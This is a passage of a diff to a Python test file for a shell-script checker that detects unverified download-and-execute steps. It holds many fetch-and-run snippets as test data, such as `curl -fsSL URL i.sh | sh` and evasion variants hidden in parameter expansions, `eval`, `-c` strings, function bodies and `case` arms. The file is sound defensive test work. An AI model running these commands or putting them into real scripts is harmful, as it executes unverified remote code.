+        # whose words bash joins, and a string glued of two quotings.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        strings = [(runner % (one + self.W + "; true"), runner % (two + self.W + "; true"))
+                   for runner in ('sh -c "%s"', 'bash -c "%s"', 'eval "%s"') for one, two in self.INSIDE]
+        strings += [("eval \"v=$(true);\" '%s; true'" % self.W, "eval \"v=$(false);\" '%s; true'" % self.W),
+                    ("sh -c \"v=$(uname); \"'%s; true'" % self.W, "sh -c \"v=$(uname -m); \"'%s; true'" % self.W),
+                    ("sh -c v=$(true)\\;'%s; true'" % self.W, "sh -c v=$(false)\\;'%s; true'" % self.W)]
+        for one, two in strings:
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertFalse(reported(pair % (one, two), shell))
+
+    def test_program_strings_that_differ_are_two_words(self):
+        # What the key does hold. One blank more in the second string, outside any substitution, and
+        # the two are two words, read every way, so each pair reports -- `main` reads these CLEAN
+        # too; one copy alone fetches and runs nothing, and reads CLEAN. (The hunts hold each under
+        # all five settings.) So with the blank behind a substitution, and where the strings differ
+        # in what a printer spells (`$(echo true)`, a `cat` of a heredoc), in an arithmetic
+        # expansion, or in a word of the substitution that holds the word itself (the round-2 seat's
+        # D.shcd-printer, D.shcd-cathd, D.shcd-arith and D.shcd-inner-word).
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\necho done\n"
+        for string in self.strings():
+            for shell in (None, "sh"):
+                with self.subTest(string=string(), shell=shell):
+                    self.assertTrue(reported(pair % (string(), string(" ")), shell))
+            self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\necho done\n" % string()))
+        self.assertTrue(reported(pair % ("eval '%s;' 'true'" % self.W, "eval '%s;' 'true '" % self.W)))
+        w, escaped = self.W, "\\" + self.W
+        for one, two in (('sh -c "v=$(true); %s; true"' % w, 'sh -c "v=$(true); %s; true "' % w),
+                         ('sh -c "$(echo true); %s; true"' % w, 'sh -c "$(echo :); %s; true"' % w),
+                         ('sh -c "$(cat <<\'EOF\'\ntrue\nEOF\n); %s; true"' % w,
+                          'sh -c "$(cat <<\'EOF\'\n:\nEOF\n); %s; true"' % w),
+                         ('sh -c "v=$((1 + 1)); %s; true"' % escaped, 'sh -c "v=$((2 + 2)); %s; true"' % escaped),
+                         ('sh -c "v=$(true >/dev/null; %s; true)"' % w, 'sh -c "v=$(false || true >/dev/null; %s; true)"' % w)):
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertTrue(reported(pair % (one, two), shell))
+
+    def test_halves_that_run_one_command_word_with_other_operands_are_apart(self):
+        # B3 (SH.cat.pipe.k2-env): `cat sums cat` and `cat` both run `cat`, but the shell reads the
+        # download only where Q is unset: the word's halves read apart, so its empty half is read
+        # beside the fetch's W. Every parent runs it.
+        row = "Y=1\n${Y:+curl -fsSL %si.sh} | ${Q:+/usr/bin/env cat sums} cat | sh\n" % URL
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(row, shell))
+
+    def test_the_folds_stop_at_eight_however_many_words(self):
+        import shell_command
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(12)))]
+        # No word past the cap is kept, and the sets are the first three's alone: a reading that
+        # kept every word, or took a set of each, would grow as two to the words.
+        for _sure in shell_reader.folds(lambda: False):
+            for stage in stages:
+                shell_reader.command(stage.argv)
+            self.assertLessEqual(len(shell_command._HALVES["words"]), shell_command._HALF_CAP)
+            self.assertLessEqual(len(shell_command._masks()), 8)
+        # And `_masks` by itself, handed more words than the cap: the first three's sets, no more.
+        shell_command._HALVES.update(words=dict.fromkeys(range(12)), both=True)
+        try:
+            masks = shell_command._masks()
+        finally:
+            shell_command._HALVES.update(words={}, both=False)
+        self.assertEqual(8, len(masks))
+        self.assertEqual({0, 1, 2}, set().union(*masks[2:]))
+
+    def test_a_word_in_a_program_a_shell_runs_is_a_place_of_its_own(self):
+        # A nested program's first such word stands first in its own parse, as the step's does in
+        # the step's: the two parses' places keep them apart (the step's its index, the program
+        # string's its text), so the fetch's W and the shell's word empty are read together, and
+        # every parent runs each.
+        for runner in ("sh -c", "bash -c", "eval"):
+            row = "X=1\n${X:+curl -fsSLo t %st}\n%s '${Y:+/usr/bin/env true} sh t'" % (URL, runner)
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_unions_folds_come_first_and_read_as_they_did(self):
+        # All W, as `main` reads them, then all empty, a word past the cap too, as the union read
+        # them; then each other set of the first three, the fourth read W.
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(4)))]
+        readings = [[len(shell_reader.command(stage.argv)) for stage in stages]
+                    for _sure in shell_reader.folds(lambda: False)]
+        self.assertEqual([[3, 3, 3, 3], [2, 2, 2, 2]], readings[:2])
+        self.assertEqual(8, len(readings))
+        self.assertEqual({3}, {reading[3] for reading in readings[2:]})
+        self.assertEqual(6, len({tuple(reading[:3]) for reading in readings[2:]}))
+
+    def test_halves_that_read_one_command_add_no_fold(self):
+        # A word whose halves read alike (`${SUDO:+sudo} apt-get`) is read both ways in the union's two
+        # folds, as #2856 read it, but adds no other: five such lines are two folds, and no cap.
+        line = "${SUDO:+sudo -E} apt-get install -y x\n"
+        self.assertEqual((2, 0), self.folds([line * 5]))
+        self.assertFalse(reported(line * 5))
+
+    def test_the_folds_grow_as_two_to_the_words_up_to_the_cap(self):
+        line = "${V%d:+/usr/bin/env true} make t%d\n"
+        for count, folds in ((0, 1), (1, 2), (2, 4), (3, 8), (4, 8), (9, 8)):
+            with self.subTest(count=count):
+                self.assertEqual(folds, self.folds(["".join(line % (n, n) for n in range(count))])[0])
+
+
+class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
+    """The #2856 seat's round-1 note 2: a comment line between `|` and `sh`, `${X:-sh -c}`
+    inside `eval`, a `-c` string and a heredoc, `sh <> tool`, and the two-line check gate,
+    which must stay CLEAN where bash is strict as its one-line twin does."""
+
+    CLOSED = ("curl -fsSL %si.sh |\n# fetched above\nsh" % URL,
+              "eval '${X:-sh -c} \"curl -fsSL %si.sh | sh\"'" % URL,
+              "bash -c '${X:-sh -c} \"curl -fsSL %si.sh | sh\"'" % URL,
+              "bash -s <<'EOF'\n${X:-sh -c} \"curl -fsSL %si.sh | sh\"\nEOF" % URL,
+              "eval 'curl -fsSL %si.sh | ${X:-bash -s}'" % URL,
+              GET + "sh <> tool", GET + "bash <>tool")
+    GATES = (GET + 'echo "%s  tool" |\nsha256sum -c -\nsh tool' % ("a" * 64),
+             GET + 'echo "%s  tool" | sha256sum -c -\nsh tool' % ("a" * 64))
+
+    def test_each_closed_row_is_reported(self):
+        for row in self.CLOSED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_two_line_check_gate_stays_clean_as_its_one_line_twin(self):
+        for row in self.GATES:
+            for shell in (None, "bash", "sh"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
 
 
 class TestAUsePipedAfterACaseCompound(unittest.TestCase):
@@ -1178,7 +4887,8 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
       `main`'s own gaps for a literal stdin shell, read as `main` reads them,
       each filed under #2331 too and reported behind a string: options that
       keep it from running its program (`bash -n -s`, `bash -t -s`,
-      `bash -s -c true`, `bash --version`, `bash -o $X -s` with `X=noexec`,
+      `bash -s -c true` and `bash --version` until #2647, `bash -o $X -s` with `X=noexec` until
+      #2858's round 4,
       and `SHELLOPTS=noexec bash -s` under a dash step); a subshell's
       `|| true`; a check in a function called under `|| true` or never called,
       or ahead of `&&` in a `-e` body; a body that reads the rest of itself
@@ -2092,6 +5802,7 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
             ("eval '! bash -s'", CHECK, "eval"), ("bash -c '! sh'", CHECK, "bash"),
             ("eval '! bash -e -s'", CHECK, "eval"), ("eval 'bash -s &'", CHECK, "eval"),
             ("eval 'bash -s < /dev/null'", CHECK, "eval"), ("eval 'bash -s <&-'", CHECK, "eval"),
+            ("eval 'SHELLOPTS=noexec bash -s'", CHECK, "eval"),
             ("eval 'sudo bash -s'", self.ECHOED, "eval"),
             ("eval 'X=1 bash -s'", self.ECHOED, "eval"),
             ("eval 'bash -s' '</dev/null'", CHECK, "eval"))]
@@ -2176,7 +5887,7 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
         # `-e` is not `sh`'s: rc 0 in every shell, bar bash refusing `SHELLOPTS=noexec` (rc 1).
         self.assert_reported([(stdin_step(runner), 1, UNGATED % name) for runner, name in (
             ("bash -nc 'sh'", "bash"), ("bash -n -c 'sh'", "bash"),
-            ("bash --version -c 'sh'", "bash"),
+            ("bash --version -c 'sh'", "bash"), ("SHELLOPTS=noexec bash -c 'sh'", "bash"),
             ("bash -o noexec -c 'sh'", "bash"), ("sh -c 'bash -nc \"sh\"'", "sh"))]
             + [(stdin_step("bash -c -e 'sh'", self.ECHOED), 1, UNGATED % "bash")])
         # A holder of `-c`, `-e`, `-u` and `-x` alone, nested or not: every shell
@@ -2266,36 +5977,25 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
                 self.assertTrue(any(UNGATED % "$CMD" in why for why in found), found)
                 self.assertTrue(any(why.startswith("hands a heredoc body or here-string to `$CMD`")
                                     for why in found), found)
-        # `builtin eval` reads through since #2665: the body is the inner shell's program, its
-        # check counted as #2500 counts one behind `eval` (every shell runs the download, rc 0).
         self.assert_reported([
-            (stdin_step("builtin eval 'bash -s'"), 1, UNGATED % "eval")])
+            (stdin_step("builtin eval 'bash -s'"), 1, "with nothing verifying what arrived")])
         self.assert_clean([stdin_step("bash -s")])
 
     def test_2500_mains_own_gaps_read_as_on_main(self):
         # `main`'s gaps, filed under #2331: CLEAN, as on `main`, though every shell runs the
         # download (rc 0), bar bash under `SHELLOPTS=noexec`, a variable it refuses (rc 1).
-        self.assert_clean([stdin_step("bash -n -s"), stdin_step("bash -o noexec -s"),
-                           stdin_step("bash -t -s", "echo start\n" + CHECK),
-                           stdin_step("bash --version"), stdin_step("bash -s -c true"),
+        self.assert_clean([stdin_step("bash -t -s", "echo start\n" + CHECK),
+                           stdin_step("SHELLOPTS=noexec bash -s"),
                            stdin_step("sh", pre="sh() { :; }\n")])
-
-    def test_2648_a_shell_started_under_noexec_is_refused_not_credited(self):
-        # #2648: `SHELLOPTS=noexec` starts bash with `-n`, so the inner shell reads the body and
-        # runs none of it -- the check never runs and the download does (behind `env`: FR x4;
-        # the bare prefix: bash refuses the readonly variable, rc 1, dash runs it, FR). Each is
-        # refused loud, beside the fetch-and-use it uncovers, where `main` credited the check
-        # (the literal) or reported only the string holder (`eval`, `-c`).
-        for runner in ("SHELLOPTS=noexec bash -s", "env SHELLOPTS=noexec bash -s",
-                       "SHELLOPTS=noexec bash -c 'sh'", "eval 'SHELLOPTS=noexec bash -s'"):
-            with self.subTest(runner=runner):
-                found = [why for _step, why in defects(stdin_step(runner))]
-                self.assertEqual(2, len(found), found)
-                self.assertTrue(any(why.startswith("cannot read command: ") and "SHELLOPTS=noexec" in why
-                                    for why in found), found)
-                self.assertTrue(any(why.startswith("fetches %stool -> tool" % URL) for why in found), found)
-        # `BASH_ENV=/dev/null` and `env X=1` change nothing: the check runs and stops the step.
-        self.assert_clean([stdin_step("BASH_ENV=/dev/null bash -s"), stdin_step("env X=1 bash -s")])
+        # No longer gaps (#2647): after `-s` bash keeps reading options, and the `-c` puts the
+        # program in the string -- the heredoc is data, its check never read; `--version`
+        # prints and exits, reading no stdin (`-version` too); and `-n` / `-o noexec` read the
+        # body and run none of it (#2858 round 3: `bash -s -version` is the letters, `n` among
+        # them), so the check never runs; FR FR FR FR on each. The body is read as `main` reads
+        # it, the step's own, and no check in it counts (round 10).
+        self.assert_reported([(stdin_step(runner), 1, UNGATED % "bash")
+                              for runner in ("bash -s -c true", "bash --version", "bash -version",
+                                             "bash -n -s", "bash -o noexec -s", "bash -s -version")])
 
     def test_2500_a_name_made_to_run_something_else_is_reported_behind_a_string(self):
         # Class 4: a function (`eval() { :; }` too), an alias, a fake `sh` first on `PATH`, a
@@ -2351,14 +6051,16 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
             (stdin_step("bash x.sh -ec 'sh -e'", self.ECHOED, pre=": > x.sh\n"), 1,
              UNGATED % "bash"),
             (stdin_step("eval 'bash - /dev/null'"), 1, UNGATED % "eval")])
-        # `main`'s gap, filed under #2331: the literal `bash - /dev/null` reads CLEAN.
-        self.assert_clean([stdin_step("bash - /dev/null")])
+        # No longer a gap (#2654): the word after a lone `-` is the script FILE, and the heredoc
+        # its data -- the check is never read, behind `eval` or not; FR FR FR FR on each. The body
+        # is read as `main` reads it, and no check in it counts (round 10).
+        self.assert_reported([(stdin_step("bash - /dev/null"), 1, UNGATED % "bash")])
         self.assert_clean([stdin_step("bash -s"), stdin_step("bash -e -s", self.ECHOED)])
 
     def test_2500_mains_literal_shell_gaps_are_reported_behind_a_string(self):
         # Class 3: each string row is reported. #2421 also closes the three function
         # literal gaps; the remaining literal twins stay filed under #2331.
-        reported, fixed, group_handoffs, gaps = [], [], [], []
+        reported, fixed, group_handoffs, bounded, gaps = [], [], [], [], []
         for string, literal, body, pre, end, function_gap in (
                 # `|| true` swallows the subshell's failure (rc 0, every shell)
                 ("( eval 'bash -s'", "( bash -s", CHECK, "", ") || true\n", False),
@@ -2384,6 +6086,9 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
             literal_step = stdin_step(literal, body, pre=pre, end=end)
             if literal == "( bash -s":
                 group_handoffs.append(literal_step)
+            elif literal == "bash -e -s" and " && echo ok" in body:
+                # PR #2849 moves #2416's released literal twin from gaps to reported.
+                bounded.append(literal_step)
             else:
                 (fixed if function_gap else gaps).append(literal_step)
         # `<>` on descriptor 0 gives the reader `/dev/null` (rc 0, every shell); since #2657
@@ -2391,10 +6096,16 @@ class TestWhichProgramAStdinReadingCommandRuns(unittest.TestCase):
         reported.append((stdin_step("eval 'bash -s <>/dev/null'"), 1, UNGATED % "eval"))
         reported.append((GET + "bash -s <<'EOF' <>/dev/null\n%s\nEOF\n" % CHECK + USE, 1,
                          "fetches %stool -> tool and making it executable" % URL))
+        # No longer a gap (#2858 round 4): an `-o` name that may expand credits no check, since it
+        # may be `noexec` -- the literal twin is reported too (-T, rc 0, on both bashes: forge).
+        noexec_twin = stdin_step("bash -o $X -s", CHECK, pre="X=noexec\n")
+        gaps.remove(noexec_twin)
+        reported.append((noexec_twin, 1, UNGATED % "bash"))
         self.assert_reported(reported)
         self.assert_reported((script, 1, "inside a function") for script in fixed)
         self.assert_reported((script, 1, "ends a group that hands its failure")
                              for script in group_handoffs)
+        self.assert_reported((script, 1, "runs ahead of `&&`") for script in bounded)
         self.assert_clean(gaps)
         self.assert_clean([stdin_step("bash -s"), stdin_step("bash -e -s", self.ECHOED)])
 
@@ -2847,6 +6558,531 @@ class TestAFunctionHeaderGluedOrAfterAKeyword(unittest.TestCase):
                 self.assertEqual([], defects(script))
 
 
+class TestABodyOnItsHeadersLine(unittest.TestCase):
+    """#2954 (HIGH): `curl … -o t` ⏎ `f() { ${Y:+/usr/bin/env true} sh t; }` ⏎ `f` read CLEAN while every
+    parent ran the download. The word behind a function's header was no command word to `_split`, which
+    cut it at its blanks, so its empty half was never read. A header now leaves the next word where a
+    command word stands, as a keyword does (`shell_command.fronts`), and the first word of a body on its
+    header's line is read as it is on a line of its own. Truth per row, twice over: bash 5.2.21 and
+    3.2.57 under `-e` and `-eo pipefail`, dash under `-e`, and each with no `-e`; a `curl` stub whose
+    payload marks when it RUNS."""
+
+    FETCH = "curl -fsSLo t %st" % URL
+    SUMS = "echo '%s  t' > sums" % ("a" * 64)
+    W = "${Y:+/usr/bin/env true}"
+    # A header with its body on its line, the same with the body on lines of its own, and its call.
+    BOTH = (("f() { %s; }", "f() {\n%s\n}", "f"), ("f () { %s; }", "f () {\n%s\n}", "f"),
+            ("f ( ) { %s; }", "f ( ) {\n%s\n}", "f"), ("f(){ %s; }", "f(){\n%s\n}", "f"),
+            ("f()\t{ %s; }", "f()\t{\n%s\n}", "f"), ("f() ( %s )", "f() (\n%s\n)", "f"))
+    # Bash's alone: dash refuses the keyword, and a `-` in a function's name.
+    BASH = (("function f { %s; }", "function f {\n%s\n}", "f"), ("function f() { %s; }", "function f() {\n%s\n}", "f"),
+            ("function f () { %s; }", "function f () {\n%s\n}", "f"), ("my-fn() { %s; }", "my-fn() {\n%s\n}", "my-fn"))
+    # A body's statements, the lines in front of its header, the lines behind its call, and whether
+    # the guard reports it under every setting (None: as the body on lines of its own, no more).
+    BODIES = (((W + " sh t",), (FETCH,), (), True),                             # the issue's FN1-union
+              ((W + " sh t",), ("X=1", "${X:+%s}" % FETCH), (), True),          # and FN1-mixed-run (#2929)
+              ((W + " " + FETCH, "sh t"), (), (), True),                        # the fetch behind the word
+              (("echo start", W + " sh t"), (FETCH,), (), True),                # the word in a second statement
+              (("${SH:-sh -e} t",), (FETCH,), (), True),                        # a default that is a shell
+              (("${SUDO:+sudo -E} sh t",), (FETCH,), (), True),                 # a wrapper bash may drop
+              (("{ %s sh t; }" % W,), (FETCH,), (), True), (("( %s sh t )" % W,), (FETCH,), (), True),
+              (("if %s sh t; then :; fi" % W,), (FETCH,), (), True), (("! %s sh t" % W,), (FETCH,), (), True),
+              (("V=1 %s sh t" % W,), (FETCH,), (), True), ((W + " sh t | cat",), (FETCH,), (), True),
+              ((W + " sh < t",), (FETCH,), (), True),
+              (("${Y:+/usr/bin/env echo} make all",), (), (), False),           # nothing fetched
+              (("${SUDO:+sudo -E} apt-get install -y x",), (FETCH,), (), False),    # nothing run
+              (("sha256sum -c sums || exit 1",), (FETCH, SUMS), ("sh t",), False),  # a gate
+              # a gate behind a wrapper bash may drop: no parent runs the download, and `main`
+              # reported it on its header's line, the word cut in two (REPORT -> CLEAN, as `main`
+              # reads it on a line of its own)
+              (("${SUDO:+sudo -E} sha256sum -c sums || exit 1",), (FETCH, SUMS), ("sh t",), False),
+              ((W + " sha256sum -c sums", "sh t"), (FETCH, SUMS), (), None))    # a check bash may not run
+
+    @staticmethod
+    def step(header, call, statements, front=(FETCH,), behind=()):
+        """A step: `front`, the function `header` holds over `statements` -- on its line where it ends
+        its body there, on lines of their own where it does not -- its `call`, and `behind`."""
+        body = ("\n" if "\n%s" in header else "; ").join(statements)
+        return "\n".join((*front, header % body, *((call,) if call else ()), *behind, "echo done")) + "\n"
+
+    def test_the_issues_rows_report(self):
+        # FN1-union and FN1-mixed-run: all 16 runs run the download, and `main` read each
+        # CLEAN under every setting. Dash refuses `function` and `my-fn()`, so only bash's settings
+        # are pinned for those (under `sh` they report as they do on lines of their own: the price).
+        for statements, front, behind, _reports in self.BODIES[:2]:
+            for headers, shells in ((self.BOTH, SHELLS), (self.BASH, (None, "bash", "bash {0}"))):
+                for one, _many, call in headers:
+                    row = self.step(one, call, statements, front, behind)
+                    for shell in shells:
+                        with self.subTest(row=row, shell=shell):
+                            self.assertTrue(reported(row, shell))
+
+    def test_a_body_on_its_headers_line_reads_as_on_lines_of_its_own(self):
+        # Every header's spelling over the issue's bodies, and two of them over every body: the same
+        # answer under every setting whichever way the body is written -- called, or never called,
+        # which reports as it does on lines of its own (the price: no parent runs it) -- and the
+        # answer named where the function is called and its shell takes the header.
+        for headers, bodies in ((self.BOTH + self.BASH, self.BODIES[:4]), (self.BOTH[:1] + self.BASH[:1], self.BODIES[4:])):
+            for one, many, call in headers:
+                for statements, front, behind, reports in bodies:
+                    for name in (call, None) if statements == self.BODIES[0][0] else (call,):
+                        row = self.step(one, name, statements, front, behind)
+                        twin = self.step(many, name, statements, front, behind)
+                        named = name and reports is not None
+                        for shell in SHELLS:
+                            with self.subTest(row=row, shell=shell):
+                                self.assertEqual(reported(twin, shell), reported(row, shell))
+                                if named and (shell in (None, "bash", "bash {0}") or (one, many, call) in self.BOTH):
+                                    self.assertEqual(reports, reported(row, shell))
+
+    def test_a_header_behind_a_keyword_or_another_command(self):
+        # A header that is not its line's first word, two on a line, a redirection or a comment behind
+        # the body, a one-line body inside a body on lines of its own, a tab for the blank in front
+        # of a header's `()`, inside it and at its `{`: every parent runs each.
+        body = "%s sh t" % self.W
+        for row in ("if true; then f() { %s; }; f; fi", "for a in 1; do f() { %s; }; f; done",
+                    "if false; then :; else f() { %s; }; f; fi", "{ f() { %s; }; f; }", "true; f() { %s; }; f",
+                    "true && f() { %s; } && f", "! f() { %s; }\nf", "g() { :; }; f() { %s; }; f",
+                    "f() { %s; } 2>/dev/null\nf", "f() { %s; } # the installer\nf", "f2() { %s; }\nf2",
+                    "f() {\n  g() { %s; }\n  g\n}\nf", "f\t() { %s; }\nf", "f (\t) { %s; }\nf",
+                    "f()\t{\t%s; }\nf"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row % body), shell))
+        for row in ("if true; then function f { %s; }; f; fi", "function\tf { %s; }\nf"):
+            for shell in (None, "bash", "bash {0}"):    # dash refuses the keyword
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n" % (self.FETCH, row % body), shell))
+
+    def test_a_program_handed_to_a_shell_is_read_the_same_way(self):
+        # The body on its header's line in a `-c` string, an `eval`, a heredoc: every parent runs each.
+        body = "%s sh t" % self.W
+        for row in ("%s\nbash -c 'f() { %s; }; f'" % (self.FETCH, body), "%s\nsh -c 'f() { %s; }; f'" % (self.FETCH, body),
+                    "%s\neval 'f() { %s; }; f'" % (self.FETCH, body), "%s\nbash <<'EOF'\nf() { %s; }\nf\nEOF" % (self.FETCH, body),
+                    "bash -c 'f() { %s %s; }; f'\nsh t" % (self.W, self.FETCH)):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_pattern_taken_off_or_replaced_keeps_mains_words_behind_a_header(self):
+        # Only a default or an alternate is whole behind a header. `${D/x/W}` puts W where `D` holds
+        # the pattern, which `main` does not read of a word it keeps whole: `D=x` ⏎ `${D/x/curl
+        # -fsSLo t …}` ⏎ `sh t` reads CLEAN on lines of its own while bash 5.2.21 and 3.2.57 run the
+        # download (dash refuses the word). On its header's line `main`'s words report it, and so
+        # they do in the #2939 round-1 seat's fuzz row F06204.
+        row = "D=x\ng() { ${D/x/curl -fsSLo t %st}; }\ng\nsh t\necho done\n" % URL
+        for shell in (None, "bash", "bash {0}"):
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(row, shell))
+
+    def test_a_header_on_another_headers_line_reads_as_it_did(self):
+        # The new flag is the whole word's alone: a header on the line of another header's `{` is
+        # still read through `at_head`, as on `main`. Read as a header there, its body would be
+        # read as `main` reads it on lines of its own, and `main` credits a gate in a function never
+        # called, or called after the run (#2949): every parent runs the download in both rows, and
+        # both report, as on `main`.
+        check = "sha256sum -c sums || exit 1"
+        for row in ("f() { g() { %s; }; }\nf\nsh t" % check, "f() { g() { %s; }; sh t; g; }\nf" % check):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n%s\necho done\n" % (self.FETCH, self.SUMS, row), shell))
+
+    def test_a_word_at_a_case_arms_head_is_read_whole_as_it_was(self):
+        # The new flag is asked in front of `at_head`, so it has to stand wherever `at_head` does. At
+        # a `case` arm's head on the arm's line the word that closed is the empty one, the clause of
+        # `fronts` no header and no keyword reaches: `main` reports each row, every parent runs the
+        # download, and with that clause gone each reads CLEAN.
+        for row in ("case x in *) %s sh t;; esac", "case x in\n  *) %s sh t ;;\nesac",
+                    "case x in\n  a) echo a ;;\n  x) %s sh t ;;\nesac"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row % self.W), shell))
+
+    def test_the_controls_read_as_they_did(self):
+        # Reported on `main` too: no such word (FN1-plainword), the body on lines of its own
+        # (FNNL-union; FNNL-mixed-run, #2929's), the `{` on the next line.
+        for row in (self.step("f() { %s; }", "f", ("sh t",)), self.step("f() {\n%s\n}", "f", (self.W + " sh t",)),
+                    self.step("f() {\n%s\n}", "f", (self.W + " sh t",), ("X=1", "${X:+%s}" % self.FETCH)),
+                    self.step("f()\n{ %s; }", "f", (self.W + " sh t",))):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row, shell))
+        # CLEAN, and no parent runs the download: the word behind a command is its argument -- behind
+        # a name with no `()`, a call of `f`, a quoted header, a header's name after `echo`.
+        for row in ("myprog %s sh t", "f %s sh t", "echo 'f()' %s sh t", "echo f %s sh t"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported("%s\n%s\necho done\n" % (self.FETCH, row % self.W), shell))
+
+
+class TestACaseBehindAKeywordOrAHeader(unittest.TestCase):
+    """#2974 (HIGH): `if true; then case x in x) sh t ;; esac; fi` behind a fetch read CLEAN while every
+    parent ran the download. `_split` looked for a `case` header only where `case` was its statement's
+    first word, so behind `then`, `else`, `do`, `{`, `!` or a function's header the first command of an
+    arm was read as the pattern's argument. The header is found behind what a command may stand behind,
+    and what stands in front of it ends as a statement of its own, as on a line of its own: each row
+    reads as its own-line twin reads, the gates in its arms too. Truth per row, twice over: bash 5.2.21
+    and 3.2.57 under `-e` and `-eo pipefail`, dash under `-e`, and each with no `-e`; a `curl` stub
+    whose payload marks when it RUNS."""
+
+    FETCH = "curl -fsSLo t %st" % URL
+    SUMS = "echo '%s  t' > sums" % ("a" * 64)
+    BASH = (None, "bash", "bash {0}")
+    # What a `case` may stand behind: the lead's line with the `case` on it, the same with the lead
+    # on a line of its own, and the call that runs it.
+    LEADS = (("if true; then %s; fi", "if true; then\n%s\nfi", None),
+             ("if false; then :; else %s; fi", "if false; then :; else\n%s\nfi", None),
+             ("if false; then :; elif true; then %s; fi", "if false; then :; elif true; then\n%s\nfi", None),
+             ("for a in 1; do %s; done", "for a in 1; do\n%s\ndone", None),
+             ("while true; do %s; break; done", "while true; do\n%s\nbreak; done", None),
+             ("until false; do %s; break; done", "until false; do\n%s\nbreak; done", None),
+             ("{ %s; }", "{\n%s\n}", None), ("{ { %s; }; }", "{ {\n%s\n}; }", None),
+             ("if true; then { %s; }; fi", "if true; then {\n%s\n}; fi", None),
+             ("if %s; then :; fi", "if\n%s\nthen :; fi", None),
+             ("while %s; do break; done", "while\n%s\ndo break; done", None),
+             ("f() { %s; }", "f() {\n%s\n}", "f"), ("f () { %s; }", "f () {\n%s\n}", "f"),
+             ("f(){ %s; }", "f(){\n%s\n}", "f"), ("f() ( %s )", "f() (\n%s\n)", "f"),
+             ("f() { if true; then %s; fi; }", "f() { if true; then\n%s\nfi; }", "f"))
+    # Bash's alone: dash refuses the keyword, and a `-` in a function's name.
+    BASH_LEADS = (("function f { %s; }", "function f {\n%s\n}", "f"),
+                  ("function f() { %s; }", "function f() {\n%s\n}", "f"),
+                  ("my-fn() { %s; }", "my-fn() {\n%s\n}", "my-fn"))
+    # An arm's commands, the lines in front of the `case`, the lines behind it, and whether the guard
+    # reports it under every setting (None: as on lines of its own, no more).
+    BODIES = ((("x) sh t ;;",), (FETCH,), (), True),                                # the issue's shape
+              (("x) %s ;;" % FETCH,), (), ("sh t",), True),                         # the fetch in the arm
+              (("x) curl -fsSL %si.sh | sh ;;" % URL,), (), (), True),              # fetched and run there
+              (("y) : ;;", "x) sh t ;;"), (FETCH,), (), True),                      # a second arm
+              (("a|x) sh t ;;",), (FETCH,), (), True), (("(x) sh t ;;",), (FETCH,), (), True),
+              (("x) ${Y:+/usr/bin/env true} sh t ;;",), (FETCH,), (), True),        # a word bash may drop
+              (("x) echo go; sh t ;;",), (FETCH,), (), True),                       # `main` read a second command
+              (("x) make all ;;",), (), (), False),                                 # nothing fetched
+              # no parent runs the download, and each reports as on lines of its own (the price): an
+              # arm that is not taken, and a gate in an arm, which `main` credits nowhere
+              (("y) sh t ;;",), (FETCH,), (), None),
+              (("x) sha256sum -c sums || exit 1 ;;",), (FETCH, SUMS), ("sh t",), None))
+
+    @staticmethod
+    def step(lead, call, arms, front=(), behind=(), below=False):
+        """A step: `front`, `lead` holding a `case` over `arms` -- on one line, or with the arms on
+        lines below the header (`below`) -- the `call` of a function, and `behind`."""
+        case = "case x in\n%s\nesac" % "\n".join("  " + arm for arm in arms) if below else "case x in %s esac" % " ".join(arms)
+        return "\n".join((*front, lead % case, *((call,) if call else ()), *behind, "echo done")) + "\n"
+
+    def test_the_issues_rows_report(self):
+        # The 17 rows of the issue's family that `main` read CLEAN in 83 cells while a parent ran the
+        # download: 16 of them under all 16 runs, the `function` spelling under bash's.
+        for row in ("%s\nif true; then case x in x) sh t ;; esac; fi" % self.FETCH,
+                    "%s\nif true; then case x in y) : ;; x) sh t ;; esac; fi" % self.FETCH,
+                    "if true; then case x in x) %s ;; esac; fi\nsh t" % self.FETCH,
+                    "%s\nif true; then case x in\n  x) sh t ;;\nesac; fi" % self.FETCH,
+                    "%s\nif false; then :; else case x in x) sh t ;; esac; fi" % self.FETCH,
+                    "%s\nfor a in 1; do case x in x) sh t ;; esac; done" % self.FETCH,
+                    "%s\nfor a in x; do case $a in\n  x) sh t ;;\nesac; done" % self.FETCH,
